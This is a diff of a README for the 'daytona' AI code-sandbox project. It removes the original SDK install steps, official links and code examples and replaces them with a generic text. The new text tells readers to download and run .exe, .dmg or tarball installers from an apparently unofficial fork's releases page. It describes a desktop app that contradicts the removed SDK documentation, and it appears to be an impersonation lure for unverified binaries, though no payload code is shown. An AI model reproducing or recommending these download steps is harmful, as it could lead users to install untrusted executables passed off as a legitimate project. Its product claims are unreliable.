@@ -1,138 +1,83 @@
-<div align="center">
+# 🚀 daytona - Your Gateway to AI-Powered Code Execution
 
-[![Documentation](https://img.shields.io/github/v/release/daytonaio/docs?label=Docs&color=23cc71)](https://www.daytona.io/docs)
-![License](https://img.shields.io/badge/License-AGPL--3-blue)
-[![Go Report Card](https://goreportcard.com/badge/github.com/daytonaio/daytona)](https://goreportcard.com/report/github.com/daytonaio/daytona)
-[![Issues - daytona](https://img.shields.io/github/issues/daytonaio/daytona)](https://github.com/daytonaio/daytona/issues)
-![GitHub Release](https://img.shields.io/github/v/release/daytonaio/daytona)
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/yaco29c/daytona/releases)
 
-</div>
+## 🌟 Overview
 
-&nbsp;
+Daytona is a secure and flexible platform designed to run AI-generated code efficiently. Whether you're looking to test new code snippets or explore advanced AI functionalities, Daytona offers the tools you need to do it safely. 
 
-<div align="center">
-  <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="https://github.com/daytonaio/daytona/raw/main/assets/images/Daytona-logotype-white.png">
-    <source media="(prefers-color-scheme: light)" srcset="https://github.com/daytonaio/daytona/raw/main/assets/images/Daytona-logotype-black.png">
-    <img alt="Daytona logo" src="https://github.com/daytonaio/daytona/raw/main/assets/images/Daytona-logotype-black.png" width="50%">
-  </picture>
-</div>
+## 🌐 Key Features
 
-<h3 align="center">
-  Run AI Code.
-  <br/>
-  Secure and Elastic Infrastructure for
-  Running Your AI-Generated Code.
-</h3>
+- **Secure Environment:** Daytona isolates your code, protecting your system from harmful actions.
+- **Easy to Use:** A simple interface makes it easy for anyone to run AI-generated code without technical knowledge.
+- **Elastic Infrastructure:** Automatically adjusts resources based on the workload.
+- **Supports Various Languages:** Run code written in multiple programming languages with ease.
 
-<p align="center">
-    <a href="https://www.daytona.io/docs"> Documentation </a>·
-    <a href="https://github.com/daytonaio/daytona/issues/new?assignees=&labels=bug&projects=&template=bug_report.md&title=%F0%9F%90%9B+Bug+Report%3A+"> Report Bug </a>·
-    <a href="https://github.com/daytonaio/daytona/issues/new?assignees=&labels=enhancement&projects=&template=feature_request.md&title=%F0%9F%9A%80+Feature%3A+"> Request Feature </a>·
-    <a href="https://go.daytona.io/slack"> Join our Slack </a>·
-    <a href="https://x.com/daytonaio"> Connect on X </a>
-</p>
+## 📋 System Requirements
 
-<p align="center">
-    <a href="https://www.producthunt.com/posts/daytona-2?embed=true&utm_source=badge-top-post-badge&utm_medium=badge&utm_souce=badge-daytona&#0045;2" target="_blank"><img src="https://api.producthunt.com/widgets/embed-image/v1/top-post-badge.svg?post_id=957617&theme=neutral&period=daily&t=1746176740150" alt="Daytona&#0032; - Secure&#0032;and&#0032;elastic&#0032;infra&#0032;for&#0032;running&#0032;your&#0032;AI&#0045;generated&#0032;code&#0046; | Product Hunt" style="width: 250px; height: 54px;" width="250" height="54" /></a>
-    <a href="https://www.producthunt.com/posts/daytona-2?embed=true&utm_source=badge-top-post-topic-badge&utm_medium=badge&utm_souce=badge-daytona&#0045;2" target="_blank"><img src="https://api.producthunt.com/widgets/embed-image/v1/top-post-topic-badge.svg?post_id=957617&theme=neutral&period=monthly&topic_id=237&t=1746176740150" alt="Daytona&#0032; - Secure&#0032;and&#0032;elastic&#0032;infra&#0032;for&#0032;running&#0032;your&#0032;AI&#0045;generated&#0032;code&#0046; | Product Hunt" style="width: 250px; height: 54px;" width="250" height="54" /></a>
-</p>
+To ensure smooth operation, your computer should meet the following requirements:
 
----
+- Operating System: Windows 10, macOS, or a recent version of Linux
+- RAM: At least 4 GB
+- Disk Space: A minimum of 1 GB available for installation
+- Network: Internet connection for downloading and accessing updates
 
-## Installation
+## 🚀 Getting Started
 
-### Python SDK
+Follow these steps to download and run Daytona:
 
-```bash
-pip install daytona
-```
+1. **Visit the Releases Page**  
+   Go to the Daytona releases page by clicking the link below:  
+   [Download Latest Release](https://github.com/yaco29c/daytona/releases)
 
-### TypeScript SDK
+2. **Select Your Version**  
+   On the releases page, find the version that matches your operating system. Look for titles like “Windows Installer,” “Mac OS Package,” or “Linux Tarball.” 
 
-```bash
-npm install @daytonaio/sdk
-```
+3. **Download the Installer**  
+   Click on the download link for your chosen version. Your browser will start downloading the file.
 
----
+4. **Install Daytona**  
+   - For Windows: Locate the downloaded `.exe` file in your Downloads folder. Double-click it and follow the on-screen instructions.
+   - For macOS: Open the downloaded `.dmg` file. Drag the Daytona app to your Applications folder.
+   - For Linux: Extract the downloaded `.tar.gz` file and follow any included installation instructions.
 
-## Features
+5. **Open Daytona**  
+   After installation, find Daytona in your applications or programs list. Launch the app to start using it.
 
-- **Lightning-Fast Infrastructure**: Sub-90ms Sandbox creation from code to execution.
-- **Separated & Isolated Runtime**: Execute AI-generated code with zero risk to your infrastructure.
-- **Massive Parallelization for Concurrent AI Workflows**: Fork Sandbox filesystem and memory state (Coming soon!)
-- **Programmatic Control**: File, Git, LSP, and Execute API
-- **Unlimited Persistence**: Your Sandboxes can live forever
-- **OCI/Docker Compatibility**: Use any OCI/Docker image to create a Sandbox
+## 📥 Download & Install
 
----
+To get started, visit this page to download:  
+[Download Latest Release](https://github.com/yaco29c/daytona/releases)
 
-## Quick Start
+## 💡 Using Daytona
 
-1. Create an account at https://app.daytona.io
-1. Generate a [new API key](https://app.daytona.io/dashboard/keys)
-1. Follow the [Getting Started docs](https://www.daytona.io/docs/getting-started/) to start using the Daytona SDK
+Once you have Daytona running, you can begin executing your AI-generated code. Here are some simple steps to follow:
 
-## Creating your first Sandbox
+1. **Create or Import Code**  
+   You can write your code directly in Daytona or import it from existing files.
 
-### Python SDK
+2. **Run Your Code**  
+   Click the "Run" button in the interface. Daytona will execute the code in a secure environment.
 
-```py
-from daytona import Daytona, DaytonaConfig, CreateSandboxBaseParams
+3. **View Results**  
+   After execution, any output or errors will be displayed on the screen. You can address issues as needed.
 
-# Initialize the Daytona client
-daytona = Daytona(DaytonaConfig(api_key="YOUR_API_KEY"))
+## 🚧 Troubleshooting
 
-# Create the Sandbox instance
-sandbox = daytona.create(CreateSandboxBaseParams(language="python"))
+If you encounter any problems while using Daytona, consider these steps:
 
-# Run code securely inside the Sandbox
-response = sandbox.process.code_run('print("Sum of 3 and 4 is " + str(3 + 4))')
-if response.exit_code != 0:
-    print(f"Error running code: {response.exit_code} {response.result}")
-else:
-    print(response.result)
+- **Check Your System Requirements:** Make sure your computer meets the minimum requirements.
+- **Reinstall Daytona:** If the application is not functioning correctly, uninstall it and then reinstall the latest version.
+- **Consult Documentation:** Review any available help documents for tips on resolving common issues.
 
-# Clean up the Sandbox
-daytona.delete(sandbox)
-```
+## 📞 Support
 
-### Typescript SDK
+For further assistance, please visit our [issues page](https://github.com/yaco29c/daytona/issues) or contact support through GitHub. 
 
-```jsx
-import { Daytona } from '@daytonaio/sdk'
+## 🌍 Community
 
-async function main() {
-  // Initialize the Daytona client
-  const daytona = new Daytona({
-    apiKey: 'YOUR_API_KEY',
-  })
-
-  let sandbox
-  try {
-    // Create the Sandbox instance
-    sandbox = await daytona.create({
-      language: 'typescript',
-    })
-    // Run code securely inside the Sandbox
-    const response = await sandbox.process.codeRun('console.log("Sum of 3 and 4 is " + (3 + 4))')
-    if (response.exitCode !== 0) {
-      console.error('Error running code:', response.exitCode, response.result)
-    } else {
-      console.log(response.result)
-    }
-  } catch (error) {
-    console.error('Sandbox flow error:', error)
-  } finally {
-    if (sandbox) await daytona.delete(sandbox)
-  }
-}
-
-main().catch(console.error)
-```
+Join the Daytona community to share experiences, report bugs, and discuss ideas. Connect with users on our [community forum](https://github.com/yaco29c/daytona/discussions).
 
 ---
 
-## Contributing
-
-Daytona is Open Source under the [GNU AFFERO GENERAL PUBLIC LICENSE](LICENSE), and is the [copyright of its contributors](NOTICE). If you would like to contribute to the software, read the Developer Certificate of Origin Version 1.1 (https://developercertificate.org/). Afterwards, navigate to the [contributing guide](CONTRIBUTING.md) to get started.
+Thank you for choosing Daytona. We hope you enjoy a secure and efficient experience running AI-generated code.
